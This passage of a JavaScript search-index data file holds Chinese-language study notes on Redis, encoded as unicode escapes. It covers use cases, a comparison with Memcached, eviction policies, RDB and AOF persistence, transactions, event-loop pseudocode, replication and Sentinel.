Redis \u8FD9\u79CD\u5185\u5B58\u578B\u6570\u636E\u5E93\u7684\u8BFB\u5199\u6027\u80FD\u975E\u5E38\u9AD8\uFF0C\u5F88\u9002\u5408\u5B58\u50A8\u9891\u7E41\u8BFB\u5199\u7684\u8BA1\u6570\u91CF\u3002`},{header:"\u7F13\u5B58",slug:"\u7F13\u5B58",content:"\u5C06\u70ED\u70B9\u6570\u636E\u653E\u5230\u5185\u5B58\u4E2D\uFF0C\u8BBE\u7F6E\u5185\u5B58\u7684\u6700\u5927\u4F7F\u7528\u91CF\u4EE5\u53CA\u6DD8\u6C70\u7B56\u7565\u6765\u4FDD\u8BC1\u7F13\u5B58\u7684\u547D\u4E2D\u7387\u3002"},{header:"\u67E5\u627E\u8868",slug:"\u67E5\u627E\u8868",content:`\u4F8B\u5982 DNS \u8BB0\u5F55\u5C31\u5F88\u9002\u5408\u4F7F\u7528 Redis \u8FDB\u884C\u5B58\u50A8\u3002
\u67E5\u627E\u8868\u548C\u7F13\u5B58\u7C7B\u4F3C\uFF0C\u4E5F\u662F\u5229\u7528\u4E86 Redis \u5FEB\u901F\u7684\u67E5\u627E\u7279\u6027\u3002\u4F46\u662F\u67E5\u627E\u8868\u7684\u5185\u5BB9\u4E0D\u80FD\u5931\u6548\uFF0C\u800C\u7F13\u5B58\u7684\u5185\u5BB9\u53EF\u4EE5\u5931\u6548\uFF0C\u56E0\u4E3A\u7F13\u5B58\u4E0D\u4F5C\u4E3A\u53EF\u9760\u7684\u6570\u636E\u6765\u6E90\u3002`},{header:"\u6D88\u606F\u961F\u5217",slug:"\u6D88\u606F\u961F\u5217",content:`List \u662F\u4E00\u4E2A\u53CC\u5411\u94FE\u8868\uFF0C\u53EF\u4EE5\u901A\u8FC7 lpush \u548C rpop \u5199\u5165\u548C\u8BFB\u53D6\u6D88\u606F
\u4E0D\u8FC7\u6700\u597D\u4F7F\u7528 Kafka\u3001RabbitMQ \u7B49\u6D88\u606F\u4E2D\u95F4\u4EF6\u3002`},{header:"\u4F1A\u8BDD\u7F13\u5B58",slug:"\u4F1A\u8BDD\u7F13\u5B58",content:`\u53EF\u4EE5\u4F7F\u7528 Redis \u6765\u7EDF\u4E00\u5B58\u50A8\u591A\u53F0\u5E94\u7528\u670D\u52A1\u5668\u7684\u4F1A\u8BDD\u4FE1\u606F\u3002
\u5F53\u5E94\u7528\u670D\u52A1\u5668\u4E0D\u518D\u5B58\u50A8\u7528\u6237\u7684\u4F1A\u8BDD\u4FE1\u606F\uFF0C\u4E5F\u5C31\u4E0D\u518D\u5177\u6709\u72B6\u6001\uFF0C\u4E00\u4E2A\u7528\u6237\u53EF\u4EE5\u8BF7\u6C42\u4EFB\u610F\u4E00\u4E2A\u5E94\u7528\u670D\u52A1\u5668\uFF0C\u4ECE\u800C\u66F4\u5BB9\u6613\u5B9E\u73B0\u9AD8\u53EF\u7528\u6027\u4EE5\u53CA\u53EF\u4F38\u7F29\u6027\u3002`},{header:"\u5206\u5E03\u5F0F\u9501\u5B9E\u73B0",slug:"\u5206\u5E03\u5F0F\u9501\u5B9E\u73B0",content:`\u5728\u5206\u5E03\u5F0F\u573A\u666F\u4E0B\uFF0C\u65E0\u6CD5\u4F7F\u7528\u5355\u673A\u73AF\u5883\u4E0B\u7684\u9501\u6765\u5BF9\u591A\u4E2A\u8282\u70B9\u4E0A\u7684\u8FDB\u7A0B\u8FDB\u884C\u540C\u6B65\u3002
\u53EF\u4EE5\u4F7F\u7528 Redis \u81EA\u5E26\u7684 SETNX \u547D\u4EE4\u5B9E\u73B0\u5206\u5E03\u5F0F\u9501\uFF0C\u9664\u6B64\u4E4B\u5916\uFF0C\u8FD8\u53EF\u4EE5\u4F7F\u7528\u5B98\u65B9\u63D0\u4F9B\u7684 RedLock \u5206\u5E03\u5F0F\u9501\u5B9E\u73B0\u3002`},{header:"\u5176\u5B83",slug:"\u5176\u5B83",content:`Set \u53EF\u4EE5\u5B9E\u73B0\u4EA4\u96C6\u3001\u5E76\u96C6\u7B49\u64CD\u4F5C\uFF0C\u4ECE\u800C\u5B9E\u73B0\u5171\u540C\u597D\u53CB\u7B49\u529F\u80FD\u3002
ZSet \u53EF\u4EE5\u5B9E\u73B0\u6709\u5E8F\u6027\u64CD\u4F5C\uFF0C\u4ECE\u800C\u5B9E\u73B0\u6392\u884C\u699C\u7B49\u529F\u80FD\u3002`},{header:"\u4E94\u3001Redis \u4E0E Memcached",slug:"\u4E94\u3001redis-\u4E0E-memcached",content:"\u4E24\u8005\u90FD\u662F\u975E\u5173\u7CFB\u578B\u5185\u5B58\u952E\u503C\u6570\u636E\u5E93\uFF0C\u4E3B\u8981\u6709\u4EE5\u4E0B\u4E0D\u540C\uFF1A"},{header:"\u6570\u636E\u7C7B\u578B",slug:"\u6570\u636E\u7C7B\u578B",content:"Memcached \u4EC5\u652F\u6301\u5B57\u7B26\u4E32\u7C7B\u578B\uFF0C\u800C Redis \u652F\u6301\u4E94\u79CD\u4E0D\u540C\u7684\u6570\u636E\u7C7B\u578B\uFF0C\u53EF\u4EE5\u66F4\u7075\u6D3B\u5730\u89E3\u51B3\u95EE\u9898\u3002"},{header:"\u6570\u636E\u6301\u4E45\u5316",slug:"\u6570\u636E\u6301\u4E45\u5316",content:"Redis \u652F\u6301\u4E24\u79CD\u6301\u4E45\u5316\u7B56\u7565\uFF1ARDB \u5FEB\u7167\u548C AOF \u65E5\u5FD7\uFF0C\u800C Memcached \u4E0D\u652F\u6301\u6301\u4E45\u5316\u3002"},{header:"\u5206\u5E03\u5F0F",slug:"\u5206\u5E03\u5F0F",content:`Memcached \u4E0D\u652F\u6301\u5206\u5E03\u5F0F\uFF0C\u53EA\u80FD\u901A\u8FC7\u5728\u5BA2\u6237\u7AEF\u4F7F\u7528\u4E00\u81F4\u6027\u54C8\u5E0C\u6765\u5B9E\u73B0\u5206\u5E03\u5F0F\u5B58\u50A8\uFF0C\u8FD9\u79CD\u65B9\u5F0F\u5728\u5B58\u50A8\u548C\u67E5\u8BE2\u65F6\u90FD\u9700\u8981\u5148\u5728\u5BA2\u6237\u7AEF\u8BA1\u7B97\u4E00\u6B21\u6570\u636E\u6240\u5728\u7684\u8282\u70B9\u3002
Redis Cluster \u5B9E\u73B0\u4E86\u5206\u5E03\u5F0F\u7684\u652F\u6301\u3002`},{header:"\u5185\u5B58\u7BA1\u7406\u673A\u5236",slug:"\u5185\u5B58\u7BA1\u7406\u673A\u5236",content:"\u5728 Redis \u4E2D\uFF0C\u5E76\u4E0D\u662F\u6240\u6709\u6570\u636E\u90FD\u4E00\u76F4\u5B58\u50A8\u5728\u5185\u5B58\u4E2D\uFF0C\u53EF\u4EE5\u5C06\u4E00\u4E9B\u5F88\u4E45\u6CA1\u7528\u7684 value \u4EA4\u6362\u5230\u78C1\u76D8\uFF0C\u800C Memcached \u7684\u6570\u636E\u5219\u4F1A\u4E00\u76F4\u5728\u5185\u5B58\u4E2D\u3002 Memcached \u5C06\u5185\u5B58\u5206\u5272\u6210\u7279\u5B9A\u957F\u5EA6\u7684\u5757\u6765\u5B58\u50A8\u6570\u636E\uFF0C\u4EE5\u5B8C\u5168\u89E3\u51B3\u5185\u5B58\u788E\u7247\u7684\u95EE\u9898\u3002\u4F46\u662F\u8FD9\u79CD\u65B9\u5F0F\u4F1A\u4F7F\u5F97\u5185\u5B58\u7684\u5229\u7528\u7387\u4E0D\u9AD8\uFF0C\u4F8B\u5982\u5757\u7684\u5927\u5C0F\u4E3A 128 bytes\uFF0C\u53EA\u5B58\u50A8 100 bytes \u7684\u6570\u636E\uFF0C\u90A3\u4E48\u5269\u4E0B\u7684 28 bytes \u5C31\u6D6A\u8D39\u6389\u4E86\u3002"},{header:"\u516D\u3001\u952E\u7684\u8FC7\u671F\u65F6\u95F4",slug:"\u516D\u3001\u952E\u7684\u8FC7\u671F\u65F6\u95F4",content:`Redis \u53EF\u4EE5\u4E3A\u6BCF\u4E2A\u952E\u8BBE\u7F6E\u8FC7\u671F\u65F6\u95F4\uFF0C\u5F53\u952E\u8FC7\u671F\u65F6\uFF0C\u4F1A\u81EA\u52A8\u5220\u9664\u8BE5\u952E\u3002
\u5BF9\u4E8E\u6563\u5217\u8868\u8FD9\u79CD\u5BB9\u5668\uFF0C\u53EA\u80FD\u4E3A\u6574\u4E2A\u952E\u8BBE\u7F6E\u8FC7\u671F\u65F6\u95F4\uFF08\u6574\u4E2A\u6563\u5217\u8868\uFF09\uFF0C\u800C\u4E0D\u80FD\u4E3A\u952E\u91CC\u9762\u7684\u5355\u4E2A\u5143\u7D20\u8BBE\u7F6E\u8FC7\u671F\u65F6\u95F4\u3002`},{header:"\u4E03\u3001\u6570\u636E\u6DD8\u6C70\u7B56\u7565",slug:"\u4E03\u3001\u6570\u636E\u6DD8\u6C70\u7B56\u7565",content:`\u53EF\u4EE5\u8BBE\u7F6E\u5185\u5B58\u6700\u5927\u4F7F\u7528\u91CF\uFF0C\u5F53\u5185\u5B58\u4F7F\u7528\u91CF\u8D85\u51FA\u65F6\uFF0C\u4F1A\u65BD\u884C\u6570\u636E\u6DD8\u6C70\u7B56\u7565\u3002
Redis \u5177\u4F53\u6709 6 \u79CD\u6DD8\u6C70\u7B56\u7565\uFF1A \u7B56\u7565
\u63CF\u8FF0 volatile-lru
\u4ECE\u5DF2\u8BBE\u7F6E\u8FC7\u671F\u65F6\u95F4\u7684\u6570\u636E\u96C6\u4E2D\u6311\u9009\u6700\u8FD1\u6700\u5C11\u4F7F\u7528\u7684\u6570\u636E\u6DD8\u6C70 volatile-ttl
\u4ECE\u5DF2\u8BBE\u7F6E\u8FC7\u671F\u65F6\u95F4\u7684\u6570\u636E\u96C6\u4E2D\u6311\u9009\u5C06\u8981\u8FC7\u671F\u7684\u6570\u636E\u6DD8\u6C70 volatile-random
\u4ECE\u5DF2\u8BBE\u7F6E\u8FC7\u671F\u65F6\u95F4\u7684\u6570\u636E\u96C6\u4E2D\u4EFB\u610F\u9009\u62E9\u6570\u636E\u6DD8\u6C70 allkeys-lru
\u4ECE\u6240\u6709\u6570\u636E\u96C6\u4E2D\u6311\u9009\u6700\u8FD1\u6700\u5C11\u4F7F\u7528\u7684\u6570\u636E\u6DD8\u6C70 allkeys-random
\u4ECE\u6240\u6709\u6570\u636E\u96C6\u4E2D\u4EFB\u610F\u9009\u62E9\u6570\u636E\u8FDB\u884C\u6DD8\u6C70 noeviction
\u7981\u6B62\u9A71\u9010\u6570\u636E \u4F5C\u4E3A\u5185\u5B58\u6570\u636E\u5E93\uFF0C\u51FA\u4E8E\u5BF9\u6027\u80FD\u548C\u5185\u5B58\u6D88\u8017\u7684\u8003\u8651\uFF0CRedis \u7684\u6DD8\u6C70\u7B97\u6CD5\u5B9E\u9645\u5B9E\u73B0\u4E0A\u5E76\u975E\u9488\u5BF9\u6240\u6709 key\uFF0C\u800C\u662F\u62BD\u6837\u4E00\u5C0F\u90E8\u5206\u5E76\u4E14\u4ECE\u4E2D\u9009\u51FA\u88AB\u6DD8\u6C70\u7684 key\u3002
\u4F7F\u7528 Redis \u7F13\u5B58\u6570\u636E\u65F6\uFF0C\u4E3A\u4E86\u63D0\u9AD8\u7F13\u5B58\u547D\u4E2D\u7387\uFF0C\u9700\u8981\u4FDD\u8BC1\u7F13\u5B58\u6570\u636E\u90FD\u662F\u70ED\u70B9\u6570\u636E\u3002\u53EF\u4EE5\u5C06\u5185\u5B58\u6700\u5927\u4F7F\u7528\u91CF\u8BBE\u7F6E\u4E3A\u70ED\u70B9\u6570\u636E\u5360\u7528\u7684\u5185\u5B58\u91CF\uFF0C\u7136\u540E\u542F\u7528 allkeys-lru \u6DD8\u6C70\u7B56\u7565\uFF0C\u5C06\u6700\u8FD1\u6700\u5C11\u4F7F\u7528\u7684\u6570\u636E\u6DD8\u6C70\u3002
Redis 4.0 \u5F15\u5165\u4E86 volatile-lfu \u548C allkeys-lfu \u6DD8\u6C70\u7B56\u7565\uFF0CLFU \u7B56\u7565\u901A\u8FC7\u7EDF\u8BA1\u8BBF\u95EE\u9891\u7387\uFF0C\u5C06\u8BBF\u95EE\u9891\u7387\u6700\u5C11\u7684\u952E\u503C\u5BF9\u6DD8\u6C70\u3002`},{header:"\u516B\u3001\u6301\u4E45\u5316",slug:"\u516B\u3001\u6301\u4E45\u5316",content:"Redis \u662F\u5185\u5B58\u578B\u6570\u636E\u5E93\uFF0C\u4E3A\u4E86\u4FDD\u8BC1\u6570\u636E\u5728\u65AD\u7535\u540E\u4E0D\u4F1A\u4E22\u5931\uFF0C\u9700\u8981\u5C06\u5185\u5B58\u4E2D\u7684\u6570\u636E\u6301\u4E45\u5316\u5230\u786C\u76D8\u4E0A\u3002"},{header:"RDB \u6301\u4E45\u5316",slug:"rdb-\u6301\u4E45\u5316",content:`\u5C06\u67D0\u4E2A\u65F6\u95F4\u70B9\u7684\u6240\u6709\u6570\u636E\u90FD\u5B58\u653E\u5230\u786C\u76D8\u4E0A\u3002
\u53EF\u4EE5\u5C06\u5FEB\u7167\u590D\u5236\u5230\u5176\u5B83\u670D\u52A1\u5668\u4ECE\u800C\u521B\u5EFA\u5177\u6709\u76F8\u540C\u6570\u636E\u7684\u670D\u52A1\u5668\u526F\u672C\u3002
\u5982\u679C\u7CFB\u7EDF\u53D1\u751F\u6545\u969C\uFF0C\u5C06\u4F1A\u4E22\u5931\u6700\u540E\u4E00\u6B21\u521B\u5EFA\u5FEB\u7167\u4E4B\u540E\u7684\u6570\u636E\u3002
\u5982\u679C\u6570\u636E\u91CF\u5F88\u5927\uFF0C\u4FDD\u5B58\u5FEB\u7167\u7684\u65F6\u95F4\u4F1A\u5F88\u957F\u3002`},{header:"AOF \u6301\u4E45\u5316",slug:"aof-\u6301\u4E45\u5316",content:`\u5C06\u5199\u547D\u4EE4\u6DFB\u52A0\u5230 AOF \u6587\u4EF6\uFF08Append Only File\uFF09\u7684\u672B\u5C3E\u3002
\u4F7F\u7528 AOF \u6301\u4E45\u5316\u9700\u8981\u8BBE\u7F6E\u540C\u6B65\u9009\u9879\uFF0C\u4ECE\u800C\u786E\u4FDD\u5199\u547D\u4EE4\u540C\u6B65\u5230\u78C1\u76D8\u6587\u4EF6\u4E0A\u7684\u65F6\u673A\u3002\u8FD9\u662F\u56E0\u4E3A\u5BF9\u6587\u4EF6\u8FDB\u884C\u5199\u5165\u5E76\u4E0D\u4F1A\u9A6C\u4E0A\u5C06\u5185\u5BB9\u540C\u6B65\u5230\u78C1\u76D8\u4E0A\uFF0C\u800C\u662F\u5148\u5B58\u50A8\u5230\u7F13\u51B2\u533A\uFF0C\u7136\u540E\u7531\u64CD\u4F5C\u7CFB\u7EDF\u51B3\u5B9A\u4EC0\u4E48\u65F6\u5019\u540C\u6B65\u5230\u78C1\u76D8\u3002\u6709\u4EE5\u4E0B\u540C\u6B65\u9009\u9879\uFF1A \u9009\u9879
\u540C\u6B65\u9891\u7387 always
\u6BCF\u4E2A\u5199\u547D\u4EE4\u90FD\u540C\u6B65 everysec
\u6BCF\u79D2\u540C\u6B65\u4E00\u6B21 no
\u8BA9\u64CD\u4F5C\u7CFB\u7EDF\u6765\u51B3\u5B9A\u4F55\u65F6\u540C\u6B65 always \u9009\u9879\u4F1A\u4E25\u91CD\u51CF\u4F4E\u670D\u52A1\u5668\u7684\u6027\u80FD\uFF1B
everysec \u9009\u9879\u6BD4\u8F83\u5408\u9002\uFF0C\u53EF\u4EE5\u4FDD\u8BC1\u7CFB\u7EDF\u5D29\u6E83\u65F6\u53EA\u4F1A\u4E22\u5931\u4E00\u79D2\u5DE6\u53F3\u7684\u6570\u636E\uFF0C\u5E76\u4E14 Redis \u6BCF\u79D2\u6267\u884C\u4E00\u6B21\u540C\u6B65\u5BF9\u670D\u52A1\u5668\u6027\u80FD\u51E0\u4E4E\u6CA1\u6709\u4EFB\u4F55\u5F71\u54CD\uFF1B
no \u9009\u9879\u5E76\u4E0D\u80FD\u7ED9\u670D\u52A1\u5668\u6027\u80FD\u5E26\u6765\u591A\u5927\u7684\u63D0\u5347\uFF0C\u800C\u4E14\u4E5F\u4F1A\u589E\u52A0\u7CFB\u7EDF\u5D29\u6E83\u65F6\u6570\u636E\u4E22\u5931\u7684\u6570\u91CF\u3002 \u968F\u7740\u670D\u52A1\u5668\u5199\u8BF7\u6C42\u7684\u589E\u591A\uFF0CAOF \u6587\u4EF6\u4F1A\u8D8A\u6765\u8D8A\u5927\u3002Redis \u63D0\u4F9B\u4E86\u4E00\u79CD\u5C06 AOF \u91CD\u5199\u7684\u7279\u6027\uFF0C\u80FD\u591F\u53BB\u9664 AOF \u6587\u4EF6\u4E2D\u7684\u5197\u4F59\u5199\u547D\u4EE4\u3002`},{header:"\u4E5D\u3001\u4E8B\u52A1",slug:"\u4E5D\u3001\u4E8B\u52A1",content:`\u4E00\u4E2A\u4E8B\u52A1\u5305\u542B\u4E86\u591A\u4E2A\u547D\u4EE4\uFF0C\u670D\u52A1\u5668\u5728\u6267\u884C\u4E8B\u52A1\u671F\u95F4\uFF0C\u4E0D\u4F1A\u6539\u53BB\u6267\u884C\u5176\u5B83\u5BA2\u6237\u7AEF\u7684\u547D\u4EE4\u8BF7\u6C42\u3002
\u4E8B\u52A1\u4E2D\u7684\u591A\u4E2A\u547D\u4EE4\u88AB\u4E00\u6B21\u6027\u53D1\u9001\u7ED9\u670D\u52A1\u5668\uFF0C\u800C\u4E0D\u662F\u4E00\u6761\u4E00\u6761\u53D1\u9001\uFF0C\u8FD9\u79CD\u65B9\u5F0F\u88AB\u79F0\u4E3A\u6D41\u6C34\u7EBF\uFF0C\u5B83\u53EF\u4EE5\u51CF\u5C11\u5BA2\u6237\u7AEF\u4E0E\u670D\u52A1\u5668\u4E4B\u95F4\u7684\u7F51\u7EDC\u901A\u4FE1\u6B21\u6570\u4ECE\u800C\u63D0\u5347\u6027\u80FD\u3002
Redis \u6700\u7B80\u5355\u7684\u4E8B\u52A1\u5B9E\u73B0\u65B9\u5F0F\u662F\u4F7F\u7528 MULTI \u548C EXEC \u547D\u4EE4\u5C06\u4E8B\u52A1\u64CD\u4F5C\u5305\u56F4\u8D77\u6765\u3002`},{header:"\u5341\u3001\u4E8B\u4EF6",slug:"\u5341\u3001\u4E8B\u4EF6",content:"Redis \u670D\u52A1\u5668\u662F\u4E00\u4E2A\u4E8B\u4EF6\u9A71\u52A8\u7A0B\u5E8F\u3002"},{header:"\u6587\u4EF6\u4E8B\u4EF6",slug:"\u6587\u4EF6\u4E8B\u4EF6",content:`\u670D\u52A1\u5668\u901A\u8FC7\u5957\u63A5\u5B57\u4E0E\u5BA2\u6237\u7AEF\u6216\u8005\u5176\u5B83\u670D\u52A1\u5668\u8FDB\u884C\u901A\u4FE1\uFF0C\u6587\u4EF6\u4E8B\u4EF6\u5C31\u662F\u5BF9\u5957\u63A5\u5B57\u64CD\u4F5C\u7684\u62BD\u8C61\u3002
Redis \u57FA\u4E8E Reactor \u6A21\u5F0F\u5F00\u53D1\u4E86\u81EA\u5DF1\u7684\u7F51\u7EDC\u4E8B\u4EF6\u5904\u7406\u5668\uFF0C\u4F7F\u7528 I/O \u591A\u8DEF\u590D\u7528\u7A0B\u5E8F\u6765\u540C\u65F6\u76D1\u542C\u591A\u4E2A\u5957\u63A5\u5B57\uFF0C\u5E76\u5C06\u5230\u8FBE\u7684\u4E8B\u4EF6\u4F20\u9001\u7ED9\u6587\u4EF6\u4E8B\u4EF6\u5206\u6D3E\u5668\uFF0C\u5206\u6D3E\u5668\u4F1A\u6839\u636E\u5957\u63A5\u5B57\u4EA7\u751F\u7684\u4E8B\u4EF6\u7C7B\u578B\u8C03\u7528\u76F8\u5E94\u7684\u4E8B\u4EF6\u5904\u7406\u5668\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/9ea86eb5-000a-4281-b948-7b567bd6f1d8.png" width=")`},{header:"\u65F6\u95F4\u4E8B\u4EF6",slug:"\u65F6\u95F4\u4E8B\u4EF6",content:`\u670D\u52A1\u5668\u6709\u4E00\u4E9B\u64CD\u4F5C\u9700\u8981\u5728\u7ED9\u5B9A\u7684\u65F6\u95F4\u70B9\u6267\u884C\uFF0C\u65F6\u95F4\u4E8B\u4EF6\u662F\u5BF9\u8FD9\u7C7B\u5B9A\u65F6\u64CD\u4F5C\u7684\u62BD\u8C61\u3002
\u65F6\u95F4\u4E8B\u4EF6\u53C8\u5206\u4E3A\uFF1A \u5B9A\u65F6\u4E8B\u4EF6\uFF1A\u662F\u8BA9\u4E00\u6BB5\u7A0B\u5E8F\u5728\u6307\u5B9A\u7684\u65F6\u95F4\u4E4B\u5185\u6267\u884C\u4E00\u6B21\uFF1B
\u5468\u671F\u6027\u4E8B\u4EF6\uFF1A\u662F\u8BA9\u4E00\u6BB5\u7A0B\u5E8F\u6BCF\u9694\u6307\u5B9A\u65F6\u95F4\u5C31\u6267\u884C\u4E00\u6B21\u3002 Redis \u5C06\u6240\u6709\u65F6\u95F4\u4E8B\u4EF6\u90FD\u653E\u5728\u4E00\u4E2A\u65E0\u5E8F\u94FE\u8868\u4E2D\uFF0C\u901A\u8FC7\u904D\u5386\u6574\u4E2A\u94FE\u8868\u67E5\u627E\u51FA\u5DF2\u5230\u8FBE\u7684\u65F6\u95F4\u4E8B\u4EF6\uFF0C\u5E76\u8C03\u7528\u76F8\u5E94\u7684\u4E8B\u4EF6\u5904\u7406\u5668\u3002`},{header:"\u4E8B\u4EF6\u7684\u8C03\u5EA6\u4E0E\u6267\u884C",slug:"\u4E8B\u4EF6\u7684\u8C03\u5EA6\u4E0E\u6267\u884C",content:`\u670D\u52A1\u5668\u9700\u8981\u4E0D\u65AD\u76D1\u542C\u6587\u4EF6\u4E8B\u4EF6\u7684\u5957\u63A5\u5B57\u624D\u80FD\u5F97\u5230\u5F85\u5904\u7406\u7684\u6587\u4EF6\u4E8B\u4EF6\uFF0C\u4F46\u662F\u4E0D\u80FD\u4E00\u76F4\u76D1\u542C\uFF0C\u5426\u5219\u65F6\u95F4\u4E8B\u4EF6\u65E0\u6CD5\u5728\u89C4\u5B9A\u7684\u65F6\u95F4\u5185\u6267\u884C\uFF0C\u56E0\u6B64\u76D1\u542C\u65F6\u95F4\u5E94\u8BE5\u6839\u636E\u8DDD\u79BB\u73B0\u5728\u6700\u8FD1\u7684\u65F6\u95F4\u4E8B\u4EF6\u6765\u51B3\u5B9A\u3002
\u4E8B\u4EF6\u8C03\u5EA6\u4E0E\u6267\u884C\u7531 aeProcessEvents \u51FD\u6570\u8D1F\u8D23\uFF0C\u4F2A\u4EE3\u7801\u5982\u4E0B\uFF1A
def aeProcessEvents(): # \u83B7\u53D6\u5230\u8FBE\u65F6\u95F4\u79BB\u5F53\u524D\u65F6\u95F4\u6700\u63A5\u8FD1\u7684\u65F6\u95F4\u4E8B\u4EF6 time_event = aeSearchNearestTimer() # \u8BA1\u7B97\u6700\u63A5\u8FD1\u7684\u65F6\u95F4\u4E8B\u4EF6\u8DDD\u79BB\u5230\u8FBE\u8FD8\u6709\u591A\u5C11\u6BEB\u79D2 remaind_ms = time_event.when - unix_ts_now() # \u5982\u679C\u4E8B\u4EF6\u5DF2\u5230\u8FBE\uFF0C\u90A3\u4E48 remaind_ms \u7684\u503C\u53EF\u80FD\u4E3A\u8D1F\u6570\uFF0C\u5C06\u5B83\u8BBE\u4E3A 0 if remaind_ms < 0: remaind_ms = 0 # \u6839\u636E remaind_ms \u7684\u503C\uFF0C\u521B\u5EFA timeval timeval = create_timeval_with_ms(remaind_ms) # \u963B\u585E\u5E76\u7B49\u5F85\u6587\u4EF6\u4E8B\u4EF6\u4EA7\u751F\uFF0C\u6700\u5927\u963B\u585E\u65F6\u95F4\u7531\u4F20\u5165\u7684 timeval \u51B3\u5B9A aeApiPoll(timeval) # \u5904\u7406\u6240\u6709\u5DF2\u4EA7\u751F\u7684\u6587\u4EF6\u4E8B\u4EF6 procesFileEvents() # \u5904\u7406\u6240\u6709\u5DF2\u5230\u8FBE\u7684\u65F6\u95F4\u4E8B\u4EF6 processTimeEvents()
\u5C06 aeProcessEvents \u51FD\u6570\u7F6E\u4E8E\u4E00\u4E2A\u5FAA\u73AF\u91CC\u9762\uFF0C\u52A0\u4E0A\u521D\u59CB\u5316\u548C\u6E05\u7406\u51FD\u6570\uFF0C\u5C31\u6784\u6210\u4E86 Redis \u670D\u52A1\u5668\u7684\u4E3B\u51FD\u6570\uFF0C\u4F2A\u4EE3\u7801\u5982\u4E0B\uFF1A
def main(): # \u521D\u59CB\u5316\u670D\u52A1\u5668 init_server() # \u4E00\u76F4\u5904\u7406\u4E8B\u4EF6\uFF0C\u76F4\u5230\u670D\u52A1\u5668\u5173\u95ED\u4E3A\u6B62 while server_is_not_shutdown(): aeProcessEvents() # \u670D\u52A1\u5668\u5173\u95ED\uFF0C\u6267\u884C\u6E05\u7406\u64CD\u4F5C clean_server()
\u4ECE\u4E8B\u4EF6\u5904\u7406\u7684\u89D2\u5EA6\u6765\u770B\uFF0C\u670D\u52A1\u5668\u8FD0\u884C\u6D41\u7A0B\u5982\u4E0B\uFF1A
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/c0a9fa91-da2e-4892-8c9f-80206a6f7047.png" width="350)`},{header:"\u5341\u4E00\u3001\u590D\u5236",slug:"\u5341\u4E00\u3001\u590D\u5236",content:`\u901A\u8FC7\u4F7F\u7528 slaveof host port \u547D\u4EE4\u6765\u8BA9\u4E00\u4E2A\u670D\u52A1\u5668\u6210\u4E3A\u53E6\u4E00\u4E2A\u670D\u52A1\u5668\u7684\u4ECE\u670D\u52A1\u5668\u3002
\u4E00\u4E2A\u4ECE\u670D\u52A1\u5668\u53EA\u80FD\u6709\u4E00\u4E2A\u4E3B\u670D\u52A1\u5668\uFF0C\u5E76\u4E14\u4E0D\u652F\u6301\u4E3B\u4E3B\u590D\u5236\u3002`},{header:"\u8FDE\u63A5\u8FC7\u7A0B",slug:"\u8FDE\u63A5\u8FC7\u7A0B",content:"\u4E3B\u670D\u52A1\u5668\u521B\u5EFA\u5FEB\u7167\u6587\u4EF6\uFF0C\u53D1\u9001\u7ED9\u4ECE\u670D\u52A1\u5668\uFF0C\u5E76\u5728\u53D1\u9001\u671F\u95F4\u4F7F\u7528\u7F13\u51B2\u533A\u8BB0\u5F55\u6267\u884C\u7684\u5199\u547D\u4EE4\u3002\u5FEB\u7167\u6587\u4EF6\u53D1\u9001\u5B8C\u6BD5\u4E4B\u540E\uFF0C\u5F00\u59CB\u5411\u4ECE\u670D\u52A1\u5668\u53D1\u9001\u5B58\u50A8\u5728\u7F13\u51B2\u533A\u4E2D\u7684\u5199\u547D\u4EE4\uFF1B \u4ECE\u670D\u52A1\u5668\u4E22\u5F03\u6240\u6709\u65E7\u6570\u636E\uFF0C\u8F7D\u5165\u4E3B\u670D\u52A1\u5668\u53D1\u6765\u7684\u5FEB\u7167\u6587\u4EF6\uFF0C\u4E4B\u540E\u4ECE\u670D\u52A1\u5668\u5F00\u59CB\u63A5\u53D7\u4E3B\u670D\u52A1\u5668\u53D1\u6765\u7684\u5199\u547D\u4EE4\uFF1B \u4E3B\u670D\u52A1\u5668\u6BCF\u6267\u884C\u4E00\u6B21\u5199\u547D\u4EE4\uFF0C\u5C31\u5411\u4ECE\u670D\u52A1\u5668\u53D1\u9001\u76F8\u540C\u7684\u5199\u547D\u4EE4\u3002"},{header:"\u4E3B\u4ECE\u94FE",slug:"\u4E3B\u4ECE\u94FE",content:`\u968F\u7740\u8D1F\u8F7D\u4E0D\u65AD\u4E0A\u5347\uFF0C\u4E3B\u670D\u52A1\u5668\u53EF\u80FD\u65E0\u6CD5\u5F88\u5FEB\u5730\u66F4\u65B0\u6240\u6709\u4ECE\u670D\u52A1\u5668\uFF0C\u6216\u8005\u91CD\u65B0\u8FDE\u63A5\u548C\u91CD\u65B0\u540C\u6B65\u4ECE\u670D\u52A1\u5668\u5C06\u5BFC\u81F4\u7CFB\u7EDF\u8D85\u8F7D\u3002\u4E3A\u4E86\u89E3\u51B3\u8FD9\u4E2A\u95EE\u9898\uFF0C\u53EF\u4EE5\u521B\u5EFA\u4E00\u4E2A\u4E2D\u95F4\u5C42\u6765\u5206\u62C5\u4E3B\u670D\u52A1\u5668\u7684\u590D\u5236\u5DE5\u4F5C\u3002\u4E2D\u95F4\u5C42\u7684\u670D\u52A1\u5668\u662F\u6700\u4E0A\u5C42\u670D\u52A1\u5668\u7684\u4ECE\u670D\u52A1\u5668\uFF0C\u53C8\u662F\u6700\u4E0B\u5C42\u670D\u52A1\u5668\u7684\u4E3B\u670D\u52A1\u5668\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/395a9e83-b1a1-4a1d-b170-d081e7bb5bab.png" width="600)`},{header:"\u5341\u4E8C\u3001Sentinel",slug:"\u5341\u4E8C\u3001sentinel",content:"Sentinel\uFF08\u54E8\u5175\uFF09\u53EF\u4EE5\u76D1\u542C\u96C6\u7FA4\u4E2D\u7684\u670D\u52A1\u5668\uFF0C\u5E76\u5728\u4E3B\u670D\u52A1\u5668\u8FDB\u5165\u4E0B\u7EBF\u72B6\u6001\u65F6\uFF0C\u81EA\u52A8\u4ECE\u4ECE\u670D\u52A1\u5668\u4E2D\u9009\u4E3E\u51FA\u65B0\u7684\u4E3B\u670D\u52A1\u5668\u3002"},{header:"\u5341\u4E09\u3001\u5206\u7247",slug:"\u5341\u4E09\u3001\u5206\u7247",content:`\u5206\u7247\u662F\u5C06\u6570\u636E\u5212\u5206\u4E3A\u591A\u4E2A\u90E8\u5206\u7684\u65B9\u6CD5\uFF0C\u53EF\u4EE5\u5C06\u6570\u636E\u5B58\u50A8\u5230\u591A\u53F0\u673A\u5668\u91CC\u9762\uF